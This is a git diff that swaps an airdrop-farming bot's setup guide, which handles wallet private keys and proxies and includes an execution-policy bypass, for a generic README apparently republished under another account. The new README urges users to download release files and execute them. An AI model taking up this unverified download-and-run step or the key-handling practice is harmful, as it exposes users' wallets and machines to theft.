@@ -1,175 +1,149 @@
-# 🚀 Bot Setup Instructions
+# Synthelix 🚀
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed to be beginner-friendly, with clear explanations for each step.
+![GitHub Release](https://img.shields.io/badge/Latest_Release-v1.0.0-blue)
 
-> [Termux guides if you run on mobile](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux)
-
----
+Welcome to **Synthelix**! This repository provides tools for automating referrals, starting nodes, claiming nodes, and connecting wallets in the Web3 ecosystem. 
 
 ## Table of Contents
 
-1. [Prerequisites](#prerequisites)
-2. [Installation Steps](#installation-steps)
-3. [Configuration Files](#configuration-files)
-   - [`configs.json`](#1-configsjson)
-   - [`privateKeys.txt`](#2-privateKeystxt)
-   - [`proxies.txt`](#4-proxiestxt)
-4. [Running the Bot](#running-the-bot)
-5. [Contact and Support](#contact-and-support)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
----
+## Introduction
 
-## Prerequisites
+Synthelix is designed to simplify your interactions with decentralized applications. Whether you want to automate airdrops, manage nodes, or streamline wallet connections, this repository has you covered. 
 
-Before running the bot, make sure you have the following installed:
+## Features
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
+- **Auto Referrals**: Automate the process of referrals to maximize your earnings.
+- **Start Node**: Quickly set up your own node with minimal configuration.
+- **Claim Node**: Easily claim rewards from various airdrop campaigns.
+- **Connect Wallet**: Simplify wallet connections for seamless transactions.
 
-Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257/1462).
+## Installation
 
--> On Windows, double click on `run.bat`. For Linux/macOS, use `run.sh` to automatically run the bot. Remember to fill in all the necessary details before running.
+To get started with Synthelix, follow these steps:
 
----
-
-## Installation Steps
-
-### 1. **Clone the Bot Repository (GitHub)**
-
-You can clone the bot repository using Git. If you don't have Git installed, [install Git here](https://git-scm.com/).
-
-- Open your terminal (Command Prompt on Windows, Terminal on Linux/macOS) and navigate to the folder where you want to store the bot files.
-
-- Run the following command to clone the repository:
-
-  ```bash
-  git clone https://github.com/MeoMunDep/synthelix.git
-  ```
-
-- After cloning, navigate into the bot's directory:
-
-  ```bash
-  cd synthelix/synthelix
-  ```
-
-### 2. **Install Dependencies:**
-
-- Once inside the bot directory, install the necessary dependencies by running the following command:
-
-```bash
-npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent ethers web3 tough-cookie axios-cookiejar-support
-```
-
-- If you're on **Windows** and encounter an Execution Policy error, run:
-
-```bash
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-```
-
-Then, run the npm install command again.
-
-- For **Linux/macOS**, if you face permission issues with the install command, prepend `sudo` to the command:
-
-```bash
-sudo npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent ethers web3 
-```
-
-### 3. **Prepare Configuration Files:**
-
-- Ensure all configuration files are set up correctly before running the bot (see [Configuration Files](#configuration-files) section).
-
----
-
-## Configuration Files
-
-### 1. `configs.json` - 📜 Adjust Bot Settings
-
-This file controls the bot’s behavior. Below is an example configuration:
-
-```json
-{
-  "timeZone": "en-US",
-  "rotateProxy": false,
-  "skipInvalidProxy": false,
-  "proxyRotationInterval": 2,
-  "delayEachAccount": [5, 8],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 100,
-  "referralCodes": ["DAuzQaAF"]
-}
-```
-
-- **Fields Explained:**
-  - `rotateProxy`: Enable or disable proxy rotation.
-  - `skipInvalidProxy`: Skip invalid proxies if `true`.
-  - `proxyRotationInterval`: Time interval (in minutes) for rotating proxies.
-  - `delayEachAccount`: Random delay range (in seconds) between accounts.
-  - `timeToRestartAllAccounts`: Time (in seconds) to restart all accounts.
-  - `howManyAccountsRunInOneTime`: Number of accounts to run simultaneously.
-  - `referralCodes`: Add your referral code (optional). Do not change it if you want to support me ^^.
-
-### 2. `privateKeys.txt` - 🗂️ User's Wallet Data
-
-- Wallets generator: [Link](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
-- EVM PRIVATEKEY
-```txt
-privatekey
-privatekey
-privatekey
-```
-
-_Note: Each row for each account._
-
-### 3. `proxies.txt` - 🌐 Proxy List (Optional)
-
-If you are using proxies, add them here. Leave the file blank if you are not using proxies. Supported formats:
-
-- [Get it from here](https://www.webshare.io/?referral_code=4l5kb3glsce7)
-
-```txt
-http://host:port
-https://host:port
-socks4://host:port
-socks5://host:port
-http://user:password@host:port
-https://user:password@host:port
-socks4://user:password@host:port
-socks5://user:password@host:port
-```
-
-_Note: each row for each account._
-
----
-
-## Running the Bot
-
-1. Navigate to the folder containing the bot files:
+1. Clone the repository:
 
    ```bash
-   cd /path/to/synthelix
+   git clone https://github.com/Ankitkush3107/Synthelix.git
    ```
 
-2. Run the bot using the following command:
+2. Navigate to the project directory:
 
    ```bash
-   node meomundep.js
+   cd Synthelix
    ```
 
----
+3. Install the required dependencies:
 
-## Contact and Support
+   ```bash
+   npm install
+   ```
 
-- **Support me via** [Referral Link](https://dashboard.synthelix.io/r/kqrf5FWN)
-- **Support me via Donate** [Here](https://t.me/KeoAirDropFreeNe/312/27801)
-- **Contact for work:** [Telegram](https://t.me/MeoMunDep)
-- **Join the support group:** [Join here](https://t.me/KeoAirDropFreeNe)
-- **Updates Channel:** [View channel](https://t.me/KeoAirDropFreeNee)
-- **YouTube Channel:** [Watch here](https://www.youtube.com/@keoairdropfreene)
-- **Instagram:** [Follow me](https://www.instagram.com/meomundep)
-- **Tiktok:** [Follow me](https://www.tiktok.com/@meomundep)
+## Usage
 
-Your support is greatly appreciated! 🐱
+To use Synthelix, you can run the scripts provided in the repository. Here’s a quick guide:
 
----
+1. **Starting a Node**:
 
-Enjoy using the bot! 🚀
+   To start your node, run:
+
+   ```bash
+   node startNode.js
+   ```
+
+2. **Claiming Airdrop**:
+
+   To claim your airdrop, execute:
+
+   ```bash
+   node claimNode.js
+   ```
+
+3. **Connecting Wallet**:
+
+   To connect your wallet, use:
+
+   ```bash
+   node connectWallet.js
+   ```
+
+Make sure to replace any placeholders in the scripts with your actual data.
+
+## Contributing
+
+We welcome contributions to improve Synthelix. If you want to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch:
+   
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+
+3. Make your changes and commit them:
+
+   ```bash
+   git commit -m "Add your feature"
+   ```
+
+4. Push to the branch:
+
+   ```bash
+   git push origin feature/YourFeature
+   ```
+
+5. Create a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or feedback, please reach out to the maintainer:
+
+- **Ankit Kush**  
+- [GitHub Profile](https://github.com/Ankitkush3107)
+
+## Releases
+
+You can find the latest releases for Synthelix [here](https://github.com/Ankitkush3107/Synthelix/releases). Download the necessary files and execute them to get started.
+
+## Topics
+
+This repository covers a range of topics related to airdrops and Web3 technologies:
+
+- airdrop
+- airdrop-application
+- airdrop-claim-bot
+- airdrop-farm
+- airdrop-free
+- airdrop-huner-download
+- airdrop2024
+- airdropfreene
+- data
+- freeairdrop
+- meomundep
+- node
+- scripts
+- synthelix
+- web3
+
+## Getting Help
+
+If you encounter any issues, please check the "Releases" section for the latest updates. You can also open an issue in the repository for support.
+
+## Conclusion
+
+Synthelix aims to make your experience in the Web3 space smoother and more efficient. Whether you are a developer or an enthusiast, our tools are designed to meet your needs. Thank you for checking out Synthelix! 
+
+Feel free to visit our [Releases](https://github.com/Ankitkush3107/Synthelix/releases) section for updates and new features.
